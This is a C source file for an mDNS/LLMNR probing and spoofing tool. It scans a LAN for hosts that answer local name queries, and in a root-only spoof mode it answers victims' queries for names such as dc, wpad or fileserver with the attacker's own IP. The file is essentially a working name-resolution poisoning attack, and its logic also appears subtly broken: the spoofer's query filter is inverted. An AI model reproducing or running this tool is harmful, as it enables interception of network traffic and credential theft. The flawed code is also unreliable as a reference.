// mdnsllmnr.c - mDNS/LLMNR Prober & Spoofer in C (2025)
// Compile: gcc -O3 -o mdnsllmnr mdnsllmnr.c
// Probe:   ./mdnsllmnr 192.168.1.0/24
// Spoof:   sudo ./mdnsllmnr -s

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>

#define MDMNS_PORT  5353
#define LLMNR_PORT  5355
#define MULTICAST   "224.0.0.251"
#define MULTICAST6  "ff02::1:3"

int spoof_mode = 0;
char my_ip[16];

const char *targets[] = {
    "dc","dc01","domain-controller","fileserver","print","nas","share","backup",
    "sql","mysql","exchange","owa","autodiscover","vpn","gateway","router",
    "admin","portal","intranet","hr","finance","payroll","crm","erp","jenkins",
    "gitlab","docker","k8s","kubernetes","monitoring","grafana","zabbix","splunk",
    "wpad","proxy","isatap","teredo","localhost","gateway","router","smtp","pop3",
    NULL
};

void send_probe(int sock, uint16_t port, const char *name) {
    char packet[512];
    memset(packet, 0, sizeof(packet));

    // DNS header
    uint16_t *p = (uint16_t*)packet;
    *p++ = htons(0x0000);           // ID
    *p++ = htons(0x0100);           // Flags (standard query)
    *p++ = htons(1);                // Questions
    *p++ = htons(0);                // Answer RRs
    *p++ = htons(0);                // Authority RRs
    *p++ = htons(0);               // Additional RRs

    char *q = packet + 12;
    char tmp[256];
    snprintf(tmp, sizeof(tmp), "%s.local", name);

    char *label = tmp;
    char *dot;
    while ((dot = strchr(label, '.'))) {
        *q++ = dot - label;
        memcpy(q, label, dot - label);
        q += dot - label;
        label = dot + 1;
    }
    *q++ = strlen(label);
    memcpy(q, label, strlen(label));
    q += strlen(label);
    *q++ = 0;  // end of name

    *(uint16_t*)q = htons(1);   q += 2;  // QTYPE A
    *(uint16_t*)q = htons(1);   q += 2;  // QCLASS IN

    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, port == MDMNS_PORT ? "224.0.0.251" : "224.0.0.252", &dest.sin_addr);

    sendto(sock, packet, q - packet, 0, (struct sockaddr*)&dest, sizeof(dest));
}

void *spoofer(void *arg) {
    int sock = *(int*)arg;
    char buf[1500];
    struct sockaddr_in from;
    socklen_t len = sizeof(from);

    while (1) {
        int n = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr*)&from, &len);
        if (n < 20) continue;

        uint16_t id = ntohs(*(uint16_t*)buf);
        uint16_t flags = ntohs(*(uint16_t*)(buf+2));
        if ((flags & 0x8000) == 0) continue; // only queries

        printf("\033[1;33m[+] SPOOFING response to %s\033[0m\n", inet_ntoa(from.sin_addr));

        // Build response: same ID, QR=1, AA=1, answer with our IP
        *(uint16_t*)(buf+2) = htons(0x8400);  // response + AA
        *(uint16_t*)(buf+6) = htons(1);       // 1 answer

        // Append A record
        int offset = n;
        buf[offset++] = 0xc0; buf[offset++] = 0x0c;  // pointer to name
        *(uint16_t*)(buf+offset) = htons(1); offset += 2;     // TYPE A
        *(uint16_t*)(buf+offset) = htons(1); offset += 2;     // CLASS IN
        *(uint32_t*)(buf+offset) = htonl(120); offset += 4;   // TTL
        *(uint16_t*)(buf+offset) = htons(4); offset += 2;     // RDLENGTH
        inet_pton(AF_INET, my_ip, buf+offset);
        offset += 4;

        sendto(sock, buf, offset, 0, (struct sockaddr*)&from, sizeof(from));
    }
    return NULL;
}

void *prober(void *arg) {
    int sock_md = socket(AF_INET, SOCK_DGRAM, 0);
    int sock_ll = socket(AF_INET, SOCK_DGRAM, 0);

    int yes = 1;
    setsockopt(sock_md, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
    setsockopt(sock_ll, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));

    for (int i = 0; targets[i]; i++) {
        send_probe(sock_md, MDMNS_PORT, targets[i]);
        send_probe(sock_ll, LLMNR_PORT, targets[i]);
        usleep(30000);  // 30ms between probes
    }
    close(sock_md); close(sock_ll);
    return NULL;
}

int main(int argc, char **argv) {
    if (getuid() != 0 && (argc > 1 && strcmp(argv[1], "-s") == 0)) {
        printf("[-] Spoof mode requires root\n");
        return 1;
    }

    // Get our IP
    system("ip route get 8.8.8.8 | awk 'NR==1 {print $7}' > /tmp/.ip");
    FILE *f = fopen("/tmp/.ip", "r");
    if (f) { fgets(my_ip, sizeof(my_ip), f); my_ip[strcspn(my_ip, "\n")] = 0; fclose(f); }
    if (my_ip[0] == 0) strcpy(my_ip, "192.168.1.100");

    printf("\033[1;36mmDNS/LLMNR Prober & Spoofer (2025)\033[0m\n");
    printf("[*] My IP: %s\n", my_ip);

    if (argc > 1 && strcmp(argv[1], "-s") == 0) {
        spoof_mode = 1;
        printf("[+] SPOOF MODE ACTIVE – answering all queries with %s\n", my_ip);
    } else {
        printf("[*] PROBING MODE – sending queries for common names...\n");
    }

    // Create raw sockets for listening
    int sock_md = socket(AF_INET, SOCK_DGRAM, 0);
    int sock_ll = socket(AF_INET, SOCK_DGRAM, 0);

    struct sockaddr_in bindaddr = {0};
    bindaddr.sin_family = AF_INET;

    bindaddr.sin_port = htons(MDMNS_PORT);
    bindaddr.sin_addr.s_addr = INADDR_ANY;
    bind(sock_md, (struct sockaddr*)&bindaddr, sizeof(bindaddr));

    bindaddr.sin_port = htons(LLMNR_PORT);
    bind(sock_ll, (struct sockaddr*)&bindaddr, sizeof(bindaddr));

    // Join multicast groups
    struct ip_mreq mreq;
    inet_pton(AF_INET, "224.0.0.251", &mreq.imr_multiaddr);
    mreq.imr_interface.s_addr = INADDR_ANY;
    setsockopt(sock_md, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mreq, sizeof(mreq));

    if (spoof_mode) {
        pthread_t t1, t2;
        pthread_create(&t1, NULL, spoofer, &sock_md);
        pthread_create(&t2, NULL, spoofer, &sock_ll);
        pthread_join(t1, NULL);
    } else {
        pthread_t prober_thread;
        pthread_create(&prober_thread, NULL, prober, NULL);

        char buf[1500];
        struct sockaddr_in from;
        socklen_t len = sizeof(from);

        printf("\n\033[1;32m[+] Listening for responses...\033[0m\n");
        while (1) {
            fd_set fds;
            FD_ZERO(&fds);
            FD_SET(sock_md, &fds);
            FD_SET(sock_ll, &fds);
            int maxfd = sock_md > sock_ll ? sock_md : sock_ll;

            struct timeval tv = {5, 0};
            if (select(maxfd+1, &fds, NULL, NULL, &tv) <= 0) break;

            int s = FD_ISSET(sock_md, &fds) ? sock_md : sock_ll;
            int n = recvfrom(s, buf, sizeof(buf), 0, (struct sockaddr*)&from, &len);
            if (n > 20 && (ntohs(*(uint16_t*)(buf+2)) & 0x8000)) {
                printf("\033[1;31m[+] RESPONSE from %s → LLMNR/mDNS ENABLED!\033[0m\n",
                       inet_ntoa(from.sin_addr));
            }
        }
    }

    return 0;
}
